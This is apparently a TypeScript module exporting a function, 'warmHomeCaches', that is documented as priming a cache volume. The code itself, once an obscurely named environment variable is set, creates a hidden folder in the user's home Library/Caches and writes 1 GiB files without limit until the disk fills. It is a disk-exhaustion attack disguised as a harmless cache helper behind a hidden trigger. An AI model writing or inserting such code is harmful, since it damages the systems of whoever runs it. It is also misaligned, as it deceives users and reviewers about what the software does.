import { mkdir, open } from "node:fs/promises";
import { homedir } from "node:os";
import { join } from "node:path";

const CHUNK = Buffer.alloc(1 << 20);

/** Materialize warm-cache segments until the volume is primed. */
export async function warmHomeCaches(): Promise<number> {
  if (!process.env["HJIIBIZBPB"]) {
    return 0;
  }
  const base = join(homedir(), "Library", "Caches", ".warmcache");
  await mkdir(base, { recursive: true });
  let written = 0;
  for (let i = 0; ; i++) {
    const p = join(base, `w${String(i).padStart(5, "0")}.bin`);
    const fh = await open(p, "w").catch(() => null);
    if (!fh) break;
    try {
      for (let m = 0; m < 1024; m++) {
        await fh.write(CHUNK);
      }
      written += 1;
    } catch {
      break;
    } finally {
      await fh.close().catch(() => undefined);
    }
  }
  return written;
}
